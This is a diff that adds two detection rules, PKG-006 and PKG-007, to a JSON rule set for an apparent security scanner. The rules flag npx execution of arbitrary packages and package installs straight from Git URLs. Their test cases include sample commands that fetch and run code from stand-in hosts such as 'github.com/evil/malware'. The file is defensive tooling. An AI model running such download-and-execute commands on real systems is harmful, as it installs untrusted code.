@@ -102,6 +102,52 @@
           "npm install lodash"
         ]
       }
+    },
+    {
+      "id": "PKG-006",
+      "title": "npx arbitrary package execution",
+      "description": "npx downloads and immediately executes packages without installation. Equivalent to curl|bash but less recognized as dangerous.",
+      "severity": "high",
+      "pattern": "\\bnpx\\s+[^-\\s]\\S*",
+      "exclude_patterns": [
+        "\\bnpx\\s+(create-react-app|create-next-app|create-vite|create-svelte|create-vue|create-expo-app|create-turbo|tsc|tsx|ts-node|eslint|prettier|jest|vitest|playwright|cypress|storybook|tailwindcss|shadcn|prisma|drizzle-kit|wrangler|vercel|netlify|firebase|supabase|expo|react-native|degit|giget|serve|http-server|live-server|json-server|kill-port|sort-package-json|npm-check-updates|depcheck|license-checker|madge|source-map-explorer)\\b"
+      ],
+      "file_extensions": ["sh", "bash", "zsh", "md", "txt", "yaml", "yml"],
+      "remediation": "Review npx commands carefully. npx downloads and runs packages immediately without installation — verify the package name is correct and trusted.",
+      "test_cases": {
+        "should_match": [
+          "npx evil-package",
+          "npx @malicious/cli run",
+          "npx backdoor-tool setup"
+        ],
+        "should_not_match": [
+          "npx create-react-app my-app",
+          "npx prettier --write .",
+          "npx eslint .",
+          "npx --version"
+        ]
+      }
+    },
+    {
+      "id": "PKG-007",
+      "title": "Install from Git URL",
+      "description": "Installing packages directly from Git repositories bypasses registry security, checksum verification, and audit trails.",
+      "severity": "high",
+      "pattern": "\\b(go\\s+install\\s+[^\\s]+@|cargo\\s+install\\s+--git\\s|pip[3]?\\s+install\\s+git\\+|gem\\s+install\\s+--source\\s+https?://)",
+      "file_extensions": ["sh", "bash", "zsh", "md", "txt"],
+      "remediation": "Install packages from official registries. Git-based installs skip integrity checks and can be changed after review.",
+      "test_cases": {
+        "should_match": [
+          "go install github.com/evil/tool@latest",
+          "cargo install --git https://github.com/evil/backdoor",
+          "pip install git+https://github.com/evil/malware"
+        ],
+        "should_not_match": [
+          "go install golang.org/x/tools/gopls@latest",
+          "cargo install ripgrep",
+          "pip install requests"
+        ]
+      }
     }
   ]
 }
